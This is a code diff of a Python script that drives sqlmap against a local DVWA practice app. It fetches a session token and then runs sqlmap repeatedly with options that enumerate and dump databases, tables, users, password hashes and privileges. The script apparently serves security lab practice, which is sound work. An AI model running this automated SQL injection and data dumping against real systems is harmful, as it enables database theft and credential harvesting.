@@ -1,53 +1,67 @@
+import subprocess
 import requests
-import time
-import json
 
 # Configuration
-sqlmap_url = 'http://localhost:8775'
-target_url = 'http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'  # Adjust this URL based on your DVWA setup
+base_url = "http://127.0.0.1:42001/"
+vuln_url = base_url + "vulnerabilities/sqli/"
+params = {
+    'id': '1',
+    'Submit': 'Submit',
+}
+headers = {
+    'Cookie': 'PHPSESSID=<your_session_id>; security=low',
+}
 
-# Function to start SQLmap scan
-def start_sqlmap_scan(target):
-    response = requests.post(f'{sqlmap_url}/task/new')
-    task_id = response.json()['taskid']
-    
-    data = {
-        'url': target,
-        'data': "id=1&Submit=Submit",
-        'method': 'GET',
-        'level': 3,
-        'risk': 2,
-        'batch': True
-    }
-    
-    response = requests.post(f'{sqlmap_url}/scan/{task_id}/start', json=data)
-    return task_id
+# Obtain the user token
+def get_user_token():
+    response = requests.get(vuln_url, headers=headers)
+    print("Raw response text:", response.text)  # Debugging: print the raw response text
+    if response.status_code == 200:
+        user_token_start = response.text.find("user_token") + 22
+        user_token_end = response.text.find('"', user_token_start)
+        return response.text[user_token_start:user_token_end]
+    else:
+        print(f"Failed to access DVWA: {response.status_code}")
+        return None
 
-# Function to check SQLmap scan status
-def check_sqlmap_status(task_id):
-    response = requests.get(f'{sqlmap_url}/scan/{task_id}/status')
-    return response.json()['status']
+def run_sqlmap(url, cookie, options):
+    command = ['python3', 'sqlmap-dev/sqlmap.py', '-u', url, '--cookie', cookie, '--batch'] + options
 
-# Function to get SQLmap scan results
-def get_sqlmap_results(task_id):
-    response = requests.get(f'{sqlmap_url}/scan/{task_id}/data')
-    return response.json()
+    try:
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(result.stdout.decode('utf-8'))
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
-# Main function
 def main():
-    # Start SQLmap scan
-    print("Starting SQLmap scan...")
-    sqlmap_task_id = start_sqlmap_scan(target_url)
+    user_token = get_user_token()
+    if not user_token:
+        print("Failed to retrieve user token.")
+        return
 
-    # Wait for SQLmap scan to complete
-    while check_sqlmap_status(sqlmap_task_id) != 'terminated':
-        print("SQLmap scan in progress...")
-        time.sleep(10)
-    
-    print("SQLmap scan completed!")
-    sqlmap_results = get_sqlmap_results(sqlmap_task_id)
-    print("SQLmap Results:")
-    print(json.dumps(sqlmap_results, indent=4))
+    url = f"{vuln_url}?id=1&Submit=Submit&user_token={user_token}"
+    cookie = headers['Cookie']
+
+    sqlmap_options = [
+        ['--dbs'],
+        ['--tables'],
+        ['--columns'],
+        ['--dump'],
+        ['--banner'],
+        ['--current-user'],
+        ['--current-db'],
+        ['--is-dba'],
+        ['--users'],
+        ['--passwords'],
+        ['--privileges'],
+        ['--roles'],
+        ['--fingerprint'],
+        ['--all'],
+    ]
+
+    for options in sqlmap_options:
+        print(f"Running SQLMap with options: {' '.join(options)}")
+        run_sqlmap(url, cookie, options)
 
 if __name__ == "__main__":
     main()
